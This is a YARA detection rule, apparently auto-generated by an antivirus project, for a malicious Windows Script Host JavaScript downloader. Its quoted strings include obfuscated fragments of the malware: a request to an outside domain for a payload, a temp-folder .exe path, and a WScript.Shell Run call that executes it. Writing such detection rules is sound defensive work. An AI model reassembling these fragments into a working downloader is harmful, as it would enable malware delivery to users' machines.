rule sig_20160328_0138b30e70215420aeea92b371eb6493 {
  meta:
    description = "datamaliciousorder - file 20160328_0138b30e70215420aeea92b371eb6493.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "4a677914cb89b1dc0b68facda3e5f2cf8c95c735dac22f6477e63a24529ab831"

  strings:
    $s1  = "function Bogfbth() {return Siprafdp[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"M8g74NvMWDN9FvE.exe\";};" fullword ascii
    $s2  = "Zhgfesieux[Qgcjxz](\"GET\", \"http://blackmountaintipis.com/mxn3aad\", false);" fullword ascii
    $s3  = "do {WScript[Gyznvbno](Ldfda() * 11)} while (Zhgfesieux[\"readystate\"] < 4 );" fullword ascii
    $s4  = "var Siprafdp = function Haozkfuvi() {return WScript[Kcnpkdwfq](\"WScript.Shell\");}();" fullword ascii
    $s5  = "function Xjesgnmcdz(Qgaao, Nqdrkvcyaq){return Qgaao - Nqdrkvcyaq;};" fullword ascii
    $s6  = "function Bmkoetft(Cfxty){Siprafdp[\"Run\"](Cfxty, Dbucf, Dbucf);};" fullword ascii
    $s7  = "function Edkdils() {return ((Xyhwk == true) && (Xyhwk == Snnkgltkz)) ? 1 : Dbucf;};" fullword ascii
    $s8  = " while (Orwwqxsv){" fullword ascii
    $s9  = "function Jfybt(Ivofq) {var Hmegqjw = (1, 2, 3, 4, 5, Ivofq); return Hmegqjw;};" fullword ascii
    $s10 = "function Aqoauz()" fullword ascii
    $s11 = "function Ldfda(){return 22;};" fullword ascii
    $s12 = "Xyhwk = true; " fullword ascii
    $s13 = "Snnkgltkz = true; " fullword ascii
    $s14 = "return Xjesgnmcdz(Vysrmxsr, Fxsej);" fullword ascii
    $s15 = "function Homuemxirp(){return Acmrqhmk;};" fullword ascii
    $s16 = "var Wpbernh = false;" fullword ascii
    $s17 = "var Xyhwk = false;" fullword ascii
    $s18 = "var Jwgokchssg = new this[\"Date\"]();" fullword ascii
    $s19 = "var Snnkgltkz = false;" fullword ascii
    $s20 = "function Aqoxruycu(){return Kcnpkdwfq;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}